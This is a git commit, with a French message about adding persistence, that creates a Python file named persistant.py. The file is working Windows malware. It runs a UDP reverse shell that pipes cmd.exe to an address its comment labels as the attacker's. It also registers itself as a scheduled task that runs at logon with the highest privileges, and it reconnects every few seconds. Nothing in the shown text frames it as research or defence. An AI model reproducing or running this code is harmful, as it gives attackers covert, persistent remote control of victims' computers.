ac7bc241817d3d7a7c40877960659d56b5a39d54
HovxGovx <angelotrandria69@gmail.com>
2024-08-04 20:34:31 +0300

    minor change plus ajout persisatce

---
+++ persistant.py
@@ -0,0 +1,70 @@
+import os
+import socket
+import subprocess
+import threading
+import time
+import winreg as reg
+def s2p(s, p, addr):
+    try:
+        while True:
+            data, addr = s.recvfrom(1024)
+            if len(data) > 0:
+                p.stdin.write(data)
+                p.stdin.flush()
+    except Exception as e:
+        print(f"Error in s2p: {e}")
+        s.close()
+
+def p2s(s, p, addr):
+    try:
+        while True:
+            s.sendto(p.stdout.read(1), addr)
+    except Exception as e:
+        print(f"Error in p2s: {e}")
+        s.close()
+
+def add_to_startup():
+    try:
+        # Chemin complet du script Python
+        script_path = os.path.abspath(__file__)
+        
+        # Commande schtasks pour créer une tâche planifiée
+        task_name = "MyPayloadTask"
+        cmd = f'schtasks /create /tn {task_name} /tr "{script_path}" /sc onlogon /rl highest /f'
+        
+        # Exécuter la commande
+        subprocess.call(cmd, shell=True)
+    except Exception as e:
+        print(f"Error adding to startup: {e}")
+
+def main():
+    add_to_startup()  # Ajouter le script au démarrage
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Utiliser UDP
+            addr = ("192.168.92.130", 9002)  # Adresse IP et port de l'attaquant
+
+            # Envoie un premier paquet pour établir la connexion
+            s.sendto(b'Hello', addr)
+
+            # Utiliser cmd.exe pour Windows
+            p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+            s2p_thread = threading.Thread(target=s2p, args=(s, p, addr))
+            s2p_thread.daemon = True
+            s2p_thread.start()
+
+            p2s_thread = threading.Thread(target=p2s, args=(s, p, addr))
+            p2s_thread.daemon = True
+            p2s_thread.start()
+
+        
+            p.wait()
+        except Exception as e:
+            print("Error: {e}")
+        finally:
+            s.close()
+            time.sleep(5)
+
+if __name__ == "__main__":
+    main()
